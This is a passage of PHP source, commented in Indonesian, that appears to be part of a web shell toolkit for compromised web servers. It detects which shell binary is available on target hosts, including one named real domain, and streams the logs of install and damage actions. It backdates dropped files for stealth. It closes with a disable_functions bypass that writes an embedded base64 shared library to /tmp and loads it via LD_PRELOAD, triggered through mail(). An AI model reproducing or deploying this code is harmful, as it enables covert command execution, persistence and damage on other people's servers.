/* v78: polyfill PHP<5 — stripos (5.0+) & scandir (5.0+). Keduanya dipakai di
   beberapa jalur (del FTP, htaccess, stealth_age, rm_rf, tcp_relay_count)
   TANPA gate -> fatal 'Call to undefined function' di PHP 4 (= HTTP 500).
   Ironisnya polyfill json_decode (PHP<5.2) juga memakai stripos — tanpa fix
   ini polyfill yang dibuat untuk PHP lama justru fatal di PHP 4. */
if (!function_exists('stripos')) {
    function stripos($haystack, $needle, $offset = 0) {
        return strpos(strtolower($haystack), strtolower($needle), $offset);
    }
}
if (!function_exists('scandir')) {
    function scandir($dir, $sort = 0) {
        $dh = @opendir($dir);
        if (!$dh) return false;
        /* sertakan '.'/'..' persis seperti native — fum_dir_count mengurangi 2 */
        $out = array('.', '..');
        while (($fn = readdir($dh)) !== false) { if ($fn === '.' || $fn === '..') continue; $out[] = $fn; }
        closedir($dh);
        if ($sort) { rsort($out); } else { sort($out); $out = array_merge(array('.', '..'), array_diff($out, array('.', '..'))); }
        return $out;
    }
}

function safe_exec($cmd) {
    if (!function_exists('shell_exec')) return '';
    $r = @shell_exec($cmd . ' 2>/dev/null');
    return is_string($r) ? trim($r) : '';
}
/* ================= SHELL-AGNOSTIC (baru v66.2) =================
   Host target bisa TANPA bash sama sekali (imc.edu.vn: 'sh: bash: not
   found'). gsp_sh_bin() = path shell pertama yang tersedia:
   getenv('GSP_SHBIN') [hook UJI saja, bukan produksi] -> /bin/bash ->
   command -v bash -> /bin/sh -> command -v sh -> command -v dash ->
   command -v busybox (+ ' sh'). Deteksi gabungan @is_file/@is_executable
   + safe_exec command -v; hasil di-cache static. */
function gsp_sh_bin() {
    static $bin = null;
    if ($bin !== null) return $bin;
    $cand = array();
    $hook = getenv('GSP_SHBIN'); // hook UJI — jangan dipakai di produksi
    if (is_string($hook) && trim($hook) !== '') $cand[] = trim($hook);
    $cand[] = '/bin/bash';
    $cand[] = safe_exec('command -v bash');
    $cand[] = '/bin/sh';
    $cand[] = safe_exec('command -v sh');
    $cand[] = safe_exec('command -v dash');
    $bb = safe_exec('command -v busybox');
    if ($bb !== '') $cand[] = $bb . ' sh';
    foreach ($cand as $c) {
        if (!is_string($c)) continue;
        $c = trim($c);
        if ($c === '') continue;
        $p = (substr($c, -3) === ' sh') ? substr($c, 0, -3) : $c; // busybox -> binary-nya
        if (@is_file($p) && @is_executable($p)) { $bin = $c; return $bin; }
    }
    $bin = '/bin/sh'; // fallback terakhir
    return $bin;
}
/* daftar kandidat berurutan utk fallback fum_run_cmd: hasil deteksi dulu,
   lalu sisa kandidat nyata yang executable (bash -> sh -> dash) */
function gsp_sh_candidates() {
    $list = array(gsp_sh_bin());
    foreach (array('/bin/bash', '/bin/sh', '/bin/dash', '/usr/bin/bash', '/usr/bin/sh', '/usr/bin/dash') as $c) {
        if (@is_file($c) && @is_executable($c) && !in_array($c, $list, true)) $list[] = $c;
    }
    return $list;
}
/* flag login: konservatif bash/sh -> ' -l', dash/busybox -> ''; kalau exec
   hidup diuji dulu ($bin -l -c 'echo ok') supaya sh-tiruan yang menolak -l
   tidak ikut diberi flag */
function gsp_sh_login_flag($bin) {
    static $cache = array();
    if (isset($cache[$bin])) return $cache[$bin];
    $flag = '';
    $b = basename(preg_replace('/ sh$/', '', strval($bin)));
    if ($b === 'bash' || $b === 'sh') {
        $t = safe_exec($bin . ' -l -c ' . escapeshellarg('echo gspok'));
        if ($t !== '' && strpos($t, 'gspok') !== false) $flag = ' -l'; // hanya jika terbukti; exec mati ('') -> tanpa -l agar banner/motd tak mencemari output
    }
    $cache[$bin] = $flag;
    return $flag;
}
/* output/exit mengindikasikan SHELL-nya sendiri yang hilang (bukan perintah
   target) -> fum_run_cmd wajib coba kandidat berikutnya */
function gsp_sh_gone($o, $code) {
    if ($code === 127 && (is_string($o) && (strpos($o, 'not found') !== false || strpos($o, 'No such file') !== false || trim($o) === ''))) return true;
    if (!is_string($o) || $o === '') return false;
    if (preg_match('/[\/\s](bash|dash|sh)\s*:\s*(command\s+)?not found/i', $o)) return true;
    if (preg_match('/(bash|dash|sh)\s*:\s*[0-9]+\s*:\s*\S*(bash|dash|sh)\s*:\s*not found/i', $o)) return true;
    if (strpos($o, 'not found') !== false && preg_match('/\/bin\/(bash|sh|dash)/', $o)) return true;
    return false;
}
function my_uid() {
    $u = safe_exec('id -u');
    if ($u !== '') return $u;
    if (function_exists('posix_geteuid')) return (string)@posix_geteuid();
    return (string)@getmyuid();
}
function my_user() {
    $u = safe_exec('whoami');
    if ($u !== '') return $u;
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && !empty($pw['name'])) return $pw['name'];
    }
    return @get_current_user();
}
function tmp_dir() {
    if (function_exists('sys_get_temp_dir')) { $d = @sys_get_temp_dir(); if ($d && @is_writable($d)) return $d; }
    if (@is_writable('/tmp')) return '/tmp';
    return dirname(__FILE__);
}
function colorize($line) {
    $c = '#d4c5b0';
    if (strpos($line, '[+]') !== false || strpos($line, '[OK]') !== false) $c = '#7dc98f';
    if (strpos($line, '[!]') !== false) $c = '#e0a34a';
    if (strpos($line, '[x]') !== false || strpos($line, 'GAGAL') !== false) $c = '#e06a6a';
    if (strpos($line, 'SECRET') !== false) $c = '#7dc9c9';
    return '<span style="color:' . $c . '">' . htmlspecialchars($line) . '</span>';
}
function echo_lines($out) {
    foreach (explode("\n", (string)$out) as $l) echo colorize($l . "\n");
}
/* STREAMING (v66.4): paksa proxy (nginx X-Accel / LiteSpeed) melepas buffer
   supaya log install/rusak jalan LIVE, bukan tampak seperti refresh: header
   anti-buffer + padding 4KB seawal mungkin di aksi streaming. */
/* header anti-buffer saja — dipanggil SEBELUM chrome HTML tercetak
   (v66.4 cacat-1: gsp_stream_begin di handler act jalan setelah ±15KB
   chrome -> headers_sent() true -> header selalu diskip) */
function gsp_stream_headers() {
    if (!headers_sent()) {
        @header('X-Accel-Buffering: no');
        @header('Cache-Control: no-cache');
        @header('Content-Encoding: none');
    }
}
function gsp_stream_begin() {
    while (function_exists('ob_get_level') && @ob_get_level() > 0) { @ob_end_clean(); }
    @ini_set('zlib.output_compression', 0);
    @ini_set('implicit_flush', 1);
    if (function_exists('ob_implicit_flush')) @ob_implicit_flush(true);
    gsp_stream_headers();
    echo str_repeat(' ', 4096) . "\n";
    @flush();
}

/* bypass terakhir: LD_PRELOAD + mail() dengan .so embedded */
function run_ldpreload($cmd, $so_b64) {
    if (!function_exists('mail') || !function_exists('putenv')) return false;
    $so = tmp_dir() . '/.gsp_' . md5(microtime() . rand()) . '.so';
    $outf = tmp_dir() . '/.gspo_' . md5(microtime() . rand());
    if (@file_put_contents($so, base64_decode($so_b64)) === false) return false;
    @chmod($so, 0755);
    gsp_stealth_age($so);
    @putenv('GSP_CMD=' . $cmd . ' > ' . escapeshellarg($outf) . ' 2>&1');
    @putenv('LD_PRELOAD=' . $so);
    for ($i = 0; $i < 3; $i++) @mail('a@localhost', 'x', 'x');
    @putenv('LD_PRELOAD');
    @putenv('GSP_CMD');
